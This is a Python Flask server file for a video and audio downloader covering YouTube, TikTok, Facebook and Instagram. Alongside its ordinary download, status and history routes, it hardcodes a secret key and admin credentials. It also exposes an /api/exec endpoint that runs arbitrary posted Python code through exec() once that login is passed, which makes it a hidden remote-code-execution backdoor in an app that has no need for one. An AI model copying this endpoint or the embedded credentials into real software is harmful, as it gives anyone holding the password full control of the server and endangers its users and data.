import os
import json
import threading
from flask import Flask, request, jsonify, send_from_directory, make_response, Response, abort, session
from flask_cors import CORS

from utils.status_manager import get_status, update_status
from utils.history_manager import load_history
from utils.cleanup import cleanup_old_files
from utils.platform_helper import detect_platform
from utils.download_registry import cancel_event_map

from services.yt_service import extract_yt_metadata, start_yt_audio_download, start_yt_video_download
from services.tt_service import extract_tt_metadata, start_tt_video_download
from services.fb_service import extract_fb_metadata, start_fb_audio_download, start_fb_video_download
from services.ig_service import extract_ig_metadata, start_ig_video_download

# ✅ App Setup
app = Flask(__name__)
CORS(app)
app.secret_key = 'supersecretkeychangeit'

# ✅ Directory Setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "static", "videos")
AUDIO_DIR = os.path.join(BASE_DIR, "static", "audios")
os.makedirs(VIDEO_DIR, exist_ok=True)
os.makedirs(AUDIO_DIR, exist_ok=True)

# ✅ Start Cleanup
def start_background_tasks():
    threading.Thread(target=cleanup_old_files, daemon=True).start()

start_background_tasks()

# ✅ Admin Credentials
VALID_USERNAME = "forest_dev"
VALID_PASSWORD = "yts$4dm1n"

# ✅ Root
@app.route('/')
def home():
    return send_from_directory("web/templates", "index.html")

# ✅ Serve Videos
@app.route('/videos/<path:filename>')
def serve_video(filename):
    return serve_media_file(VIDEO_DIR, filename)

# ✅ Serve Audios
@app.route('/audios/<path:filename>')
def serve_audio(filename):
    return serve_media_file(AUDIO_DIR, filename)

# ✅ Shared Media Serve Logic
def serve_media_file(directory, filename):
    try:
        file_path = os.path.join(directory, filename)
        if not os.path.isfile(file_path):
            return jsonify({'error': 'File not found'}), 404

        ext = os.path.splitext(filename)[1].lower()
        mime_type = {
            '.mp4': 'video/mp4',
            '.webm': 'video/webm',
            '.mkv': 'video/x-matroska',
            '.mov': 'video/quicktime',
            '.mp3': 'audio/mpeg',
            '.m4a': 'audio/mp4',
            '.aac': 'audio/aac',
            '.ogg': 'audio/ogg',
            '.wav': 'audio/wav'
        }.get(ext, 'application/octet-stream')

        response = make_response(send_from_directory(directory, filename, mimetype=mime_type))
        response.headers.update({
            'Access-Control-Allow-Origin': '*',
            'Content-Disposition': f'attachment; filename="{filename}"',
            'Content-Type': mime_type
        })
        return response
    except Exception as e:
        return jsonify({'error': f'Failed to serve file: {str(e)}'}), 500

# ✅ /fetch_info
@app.route('/fetch_info', methods=['POST'])
def fetch_info():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        if not url:
            abort(400, "URL is required.")

        platform = detect_platform(url)
        headers = request.headers

        print(f"[FETCH] {platform.upper()} metadata → {url}")

        if platform == "youtube":
            return jsonify(extract_yt_metadata(url, headers))
        elif platform == "tiktok":
            return jsonify(extract_tt_metadata(url, headers))
        elif platform == "facebook":
            return jsonify(extract_fb_metadata(url, headers))
        elif platform == "instagram":
            return jsonify(extract_ig_metadata(url, headers))
        else:
            return jsonify({'error': 'Unsupported platform'}), 400

    except Exception as e:
        return jsonify({'error': f'Exception during fetch: {str(e)}'}), 500

# ✅ /download
@app.route('/download', methods=['POST'])
def download():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        quality = data.get('quality', '').strip()
        type_ = data.get('type', 'video').strip().lower()
        audio_lang = data.get('audio_lang')
        bandwidth = data.get('bandwidth_limit')

        if not url or not quality:
            return jsonify({'error': 'Missing URL or quality'}), 400

        platform = detect_platform(url)
        headers = request.headers
        print(f"[DOWNLOAD] Platform={platform}, Type={type_}, Quality={quality}, Lang={audio_lang}")

        if platform == "youtube":
            if type_ == "audio":
                download_id = start_yt_audio_download(url, headers, audio_quality=quality)
            else:
                download_id = start_yt_video_download(url, quality, headers, audio_lang, bandwidth)
        elif platform == "tiktok":
            download_id = start_tt_video_download(url, quality, headers)
        elif platform == "facebook":
            if type_ == "audio":
                download_id = start_fb_audio_download(url, headers)
            else:
                download_id = start_fb_video_download(url, quality, headers, audio_lang, bandwidth)
        elif platform == "instagram":
            download_id = start_ig_video_download(url, quality, headers)
        else:
            return jsonify({'error': 'Unsupported platform'}), 400

        return jsonify({'download_id': download_id, 'status': 'started'})

    except Exception as e:
        return jsonify({'error': f'Failed to start download: {str(e)}'}), 500

# ✅ /cancel
@app.route('/cancel/<download_id>', methods=['POST'])
def cancel(download_id):
    try:
        cancel_event = cancel_event_map.get(download_id)
        if cancel_event:
            cancel_event.set()
            update_status(download_id, {"status": "cancelled"})
            return jsonify({'status': 'cancelled'})
        return jsonify({'error': 'Invalid download ID'}), 400
    except Exception as e:
        return jsonify({'error': f'Failed to cancel: {str(e)}'}), 500

# ✅ /status
@app.route('/status/<download_id>')
def status(download_id):
    try:
        data = get_status(download_id)
        if not data:
            return jsonify({'error': 'Invalid download ID'}), 404
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': f'Status check failed: {str(e)}'}), 500

# ✅ /history
@app.route('/history')
def history():
    try:
        return jsonify(load_history())
    except Exception as e:
        return jsonify({'error': f'Failed to load history: {str(e)}'}), 500

# ✅ /extract
@app.route('/extract', methods=['POST'])
def extract_from_webview():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        if not url:
            return jsonify({'error': 'URL is required'}), 400
        print(f"[EXTRACT] Extracting from WebView: {url}")
        return jsonify(get_video_info(url))
    except Exception as e:
        return jsonify({'error': f'Failed to extract info: {str(e)}'}), 500

# ✅ /api/login
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if username == VALID_USERNAME and password == VALID_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

# ✅ /api/exec
@app.route('/api/exec', methods=['POST'])
def exec_code():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        data = request.get_json()
        code = data.get('code', '')
        local_vars = {}
        exec(code, {}, local_vars)
        return jsonify({'output': local_vars})
    except Exception as e:
        return jsonify({'error': str(e)})

# ✅ Dummy Routes
@app.route('/favicon.ico')
@app.route('/ads.txt')
@app.route('/robots.txt')
def dummy_block():
    return '', 204

# ✅ Manual fallback
def get_video_info(url):
    platform = detect_platform(url)
    headers = request.headers
    if platform == "youtube":
        return extract_yt_metadata(url, headers)
    elif platform == "tiktok":
        return extract_tt_metadata(url, headers)
    elif platform == "facebook":
        return extract_fb_metadata(url, headers)
    elif platform == "instagram":
        return extract_ig_metadata(url, headers)
    else:
        return {"error": "Unsupported platform"}

# ✅ Start App
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
